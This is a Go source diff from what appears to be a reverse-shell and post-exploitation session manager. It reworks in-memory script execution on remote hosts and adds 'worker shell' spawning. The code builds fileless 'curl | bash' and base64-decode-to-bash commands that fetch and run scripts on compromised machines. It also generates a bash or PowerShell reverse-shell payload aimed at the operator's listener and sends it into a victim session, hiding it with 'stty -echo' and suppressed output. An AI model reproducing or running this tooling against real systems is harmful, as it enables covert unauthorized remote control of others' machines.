@@ -192,10 +192,9 @@ func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string
 			return fmt.Errorf("source not found: %w", err)
 		}
 	}
-	// Output file (named after script for easy identification)
-	outputPath := s.getOutputPath(localPath)
 
-	// Create empty output file for tail -f
+	// Output file for local tail -f
+	outputPath := s.getOutputPath(localPath)
 	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
 		if cleanup != nil {
 			cleanup()
@@ -203,118 +202,53 @@ func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Try HTTP method first when binbag is enabled (curl | bash - blazing fast!)
-	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
-		filename := filepath.Base(localPath)
-		httpURL := GlobalRuntimeConfig.GetHTTPURL(filename)
-
-		// Build args
-		argsStr := ""
-		if len(args) > 0 {
-			argsStr = " " + strings.Join(args, " ")
-		}
-
-		// Remote output file for background execution
-		remoteOutput := fmt.Sprintf("/tmp/gummy_%s_%d.out", filepath.Base(localPath), time.Now().Unix())
-
-		// Run in background on remote — conn stays free!
-		bgCmd := fmt.Sprintf("nohup bash -c 'curl -s \"%s\" | bash -s%s' > %s 2>&1 &\n", httpURL, argsStr, remoteOutput)
-		s.Conn.Write([]byte(bgCmd))
-		time.Sleep(500 * time.Millisecond)
-
-		// Drain the echo of the background command
-		drainBuf := make([]byte, 4096)
-		s.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
-		for {
-			_, err := s.Conn.Read(drainBuf)
-			if err != nil {
-				break
-			}
-		}
-		s.Conn.SetReadDeadline(time.Time{})
-
-		// Now use ExecuteWithStreaming to tail the remote output file
-		// This captures output to local file for the terminal window
-		// The tail can be interrupted (Ctrl+C / detach) without killing the module
-		tailCmd := fmt.Sprintf("tail -f %s", outputPath)
-		if err := OpenTerminal(tailCmd); err != nil {
-			// Non-fatal
-		}
-		time.Sleep(300 * time.Millisecond)
-
-		// Start tail -f with cancellable context (cancelled when user does shell/F12)
-		moduleCtx, moduleCancel := context.WithCancel(context.Background())
-		s.moduleCancel = moduleCancel
-
-		go func() {
-			if cleanup != nil {
-				defer cleanup()
-			}
-			defer func() { s.moduleCancel = nil }()
-			remoteTailCmd := fmt.Sprintf("tail -f %s", remoteOutput)
-			s.Handler.ExecuteWithStreamingCtx(moduleCtx, remoteTailCmd, outputPath)
-		}()
-
-		return nil
-	}
-
-	// Cleanup for non-HTTP path
-	if cleanup != nil {
-		defer cleanup()
-	}
-
-	// Fallback: b64 variable upload (works without binbag)
-	varName := fmt.Sprintf("_gummy_script_%d", time.Now().UnixNano())
-
-	// Upload script to bash variable (in-memory, no disk write)
-	if err := t.UploadToBashVariable(context.Background(), localPath, varName); err != nil {
-		return fmt.Errorf("upload to memory failed: %w", err)
-	}
-
-	// Build args
+	// Build the remote command
 	argsStr := ""
 	if len(args) > 0 {
 		argsStr = " " + strings.Join(args, " ")
 	}
 
-	// Remote output file for background execution
-	remoteOutput := fmt.Sprintf("/tmp/gummy_%s_%d.out", filepath.Base(localPath), time.Now().Unix())
-
-	// Run in background on remote — conn stays free!
-	bgCmd := fmt.Sprintf("nohup bash -c 'echo \"$%s\" | base64 -d | bash -s%s' > %s 2>&1 &\n", varName, argsStr, remoteOutput)
-	s.Conn.Write([]byte(bgCmd))
-	time.Sleep(500 * time.Millisecond)
-
-	// Cleanup variable
-	s.Conn.Write([]byte(fmt.Sprintf("unset %s\n", varName)))
-	time.Sleep(100 * time.Millisecond)
-
-	// Drain echo
-	drainBuf := make([]byte, 4096)
-	s.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
-	for {
-		_, err := s.Conn.Read(drainBuf)
-		if err != nil {
-			break
+	var remoteCmd string
+	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
+		// HTTP: curl | bash (single HTTP request, fast)
+		filename := filepath.Base(localPath)
+		httpURL := GlobalRuntimeConfig.GetHTTPURL(filename)
+		remoteCmd = fmt.Sprintf("curl -s '%s' | bash -s%s", httpURL, argsStr)
+	} else {
+		// B64: upload to variable, then execute
+		varName := fmt.Sprintf("_gummy_script_%d", time.Now().UnixNano())
+		if err := t.UploadToBashVariable(context.Background(), localPath, varName); err != nil {
+			if cleanup != nil {
+				cleanup()
+			}
+			return fmt.Errorf("upload to memory failed: %w", err)
 		}
+		remoteCmd = fmt.Sprintf("echo \"$%s\" | base64 -d | bash -s%s", varName, argsStr)
+		// Cleanup variable after execution starts (deferred in goroutine)
+		defer func() {
+			time.Sleep(1 * time.Second)
+			s.Conn.Write([]byte(fmt.Sprintf("unset %s\n", varName)))
+		}()
 	}
-	s.Conn.SetReadDeadline(time.Time{})
 
-	// Open terminal with tail -f of local output file
+	// Open terminal window with tail -f of local output file
 	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
-	if err := OpenTerminal(tailCmd); err != nil {
-		// Non-fatal
-	}
+	OpenTerminal(tailCmd)
 	time.Sleep(300 * time.Millisecond)
 
-	// Start tail -f with cancellable context
+	// Run script in foreground on remote — ExecuteWithStreamingCtx captures output
+	// to local file. The script runs until completion. While running, the conn is
+	// occupied by the goroutine reading output. When user does shell/F12, the relay
+	// starts and takes over — script output appears in the shell viewport (expected).
 	moduleCtx, moduleCancel := context.WithCancel(context.Background())
 	s.moduleCancel = moduleCancel
 
 	go func() {
+		if cleanup != nil {
+			defer cleanup()
+		}
 		defer func() { s.moduleCancel = nil }()
-		remoteTailCmd := fmt.Sprintf("tail -f %s", remoteOutput)
-		s.Handler.ExecuteWithStreamingCtx(moduleCtx, remoteTailCmd, outputPath)
+		s.Handler.ExecuteWithStreamingCtx(moduleCtx, remoteCmd, outputPath)
 	}()
 
 	return nil
@@ -1677,36 +1611,96 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 		return
 	}
 
-	spinID := m.startSpinner(fmt.Sprintf("Running %s...", moduleName))
+	spinID := m.startSpinner(fmt.Sprintf("Spawning worker shell for %s...", moduleName))
 
 	go func() {
-		// Stop relay for exclusive conn access (module uses conn for ExecuteWithStreaming)
-		// NOTE: relay is NOT restarted here — module's goroutine keeps using conn.
-		// Relay restarts when user enters shell again (F12/shell command).
-		if session.relayActive {
-			m.StopShellRelay()
-			time.Sleep(600 * time.Millisecond)
+		// Like Penelope: spawn a NEW session to run the module.
+		// The main session stays free for shell interaction.
+		spawnIP := GlobalRuntimeConfig.GetPivotIP()
+		if spawnIP == "" || m.listenerPort == 0 {
+			m.stopSpinner(spinID)
+			m.notify(ui.Error("Module failed: no listener IP/port available") + "\n")
+			m.notifyOverlay(fmt.Sprintf("Module %s failed", moduleName), 2)
+			return
 		}
 
-		// Disable PTY echo for the setup phase
+		// Send spawn payload (suppressed from shell viewport)
+		if session.relayActive {
+			m.relaySuppressNano.Store(time.Now().Add(2 * time.Second).UnixNano())
+		}
 		if session.Handler != nil && session.Handler.IsPTYUpgraded() {
 			session.Conn.Write([]byte("stty -echo\n"))
 			time.Sleep(100 * time.Millisecond)
 		}
 
-		// Suppress stdout to prevent module's fmt.Println from corrupting TUI
+		gen := NewReverseShellGenerator(spawnIP, m.listenerPort)
+		platform := session.Platform
+		if platform == "detecting..." || platform == "unknown" {
+			platform = "linux"
+		}
+		var payload string
+		switch platform {
+		case "linux", "macos":
+			payload = gen.GenerateBash() + "\n"
+		case "windows":
+			payload = gen.GeneratePowerShell() + "\n"
+		default:
+			m.stopSpinner(spinID)
+			m.notify(ui.Error(fmt.Sprintf("Module failed: unsupported platform %s", platform)) + "\n")
+			return
+		}
+
+		initialCount := m.GetSessionCount()
+		session.Conn.Write([]byte(payload))
+
+		if session.Handler != nil && session.Handler.IsPTYUpgraded() {
+			time.Sleep(100 * time.Millisecond)
+			session.Conn.Write([]byte("stty echo\n"))
+		}
+
+		// Wait for worker session to connect (max 10s)
+		var workerSession *SessionInfo
+		for i := 0; i < 50; i++ {
+			time.Sleep(200 * time.Millisecond)
+			if m.GetSessionCount() > initialCount {
+				// Find the newest session
+				m.mu.RLock()
+				var newest *SessionInfo
+				for _, s := range m.sessions {
+					if newest == nil || s.NumID > newest.NumID {
+						newest = s
+					}
+				}
+				workerSession = newest
+				m.mu.RUnlock()
+				break
+			}
+		}
+
+		if workerSession == nil {
+			m.stopSpinner(spinID)
+			m.notify(ui.Error(fmt.Sprintf("Module %s failed: worker shell did not connect", moduleName)) + "\n")
+			m.notifyOverlay(fmt.Sprintf("Module %s failed — no worker shell", moduleName), 2)
+			return
+		}
+
+		// Wait for worker session detection to complete
+		for i := 0; i < 15; i++ {
+			if workerSession.Platform != "detecting..." {
+				break
+			}
+			time.Sleep(500 * time.Millisecond)
+		}
+
+		m.spinnerUpdate(spinID, fmt.Sprintf("Running %s on worker session #%d...", moduleName, workerSession.NumID))
+
+		// Run module on the WORKER session (main session stays free)
 		old := os.Stdout
 		devnull, _ := os.Open(os.DevNull)
 		os.Stdout = devnull
-		err := module.Run(context.Background(), session, args)
+		err := module.Run(context.Background(), workerSession, args)
 		os.Stdout = old
 		devnull.Close()
-
-		// Restore echo (module setup is done, ExecuteWithStreaming runs in background)
-		if session.Handler != nil && session.Handler.IsPTYUpgraded() {
-			session.Conn.Write([]byte("stty echo\n"))
-			time.Sleep(100 * time.Millisecond)
-		}
 
 		m.stopSpinner(spinID)
 
@@ -1714,7 +1708,7 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 			m.notify(ui.Error(fmt.Sprintf("Module %s failed: %v", moduleName, err)) + "\n")
 			m.notifyOverlay(fmt.Sprintf("Module %s failed", moduleName), 2)
 		} else {
-			m.notify(ui.Info(fmt.Sprintf("Module %s — output sent to new terminal window", moduleName)) + "\n")
+			m.notify(ui.Info(fmt.Sprintf("Module %s — output sent to new terminal window (worker #%d)", moduleName, workerSession.NumID)) + "\n")
 			m.notifyOverlay(fmt.Sprintf("Module %s started", moduleName), 0)
 		}
 	}()
